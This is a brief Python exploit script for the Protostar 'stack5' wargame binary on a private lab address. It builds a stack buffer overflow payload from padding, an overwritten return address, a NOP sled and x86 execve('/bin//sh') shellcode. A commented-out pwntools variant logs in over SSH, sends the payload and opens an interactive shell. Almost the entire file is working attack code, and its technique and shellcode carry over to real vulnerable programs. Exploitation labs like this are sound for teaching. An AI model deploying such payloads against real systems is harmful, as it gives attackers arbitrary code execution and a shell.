# from pwn import *
# import struct

# USER = 'user'
# PASS = 'user'
IP = '192.168.100.10'
PORT = 22

# new_eip = p32(0xbffffcac+60)
# padding = b"A"*76
# NOP_sled = b"\x90"*30
# shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

# payload = padding + new_eip + NOP_sled + shellcode

# shell = ssh(user=USER,password=PASS,host=IP,port=PORT)
# r = shell.run('/opt/protostar/bin/stack5')
# r.sendline(payload)
# r.interactive()


import struct
import socket

# s = socket.socket()
# s.connect((IP,PORT))


new_eip = struct.pack("<I",0xbffffcac+60)
padding = b"A"*76
NOP_sled = b"\x90"*30
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

payload = padding + new_eip + NOP_sled + shellcode

print (payload)



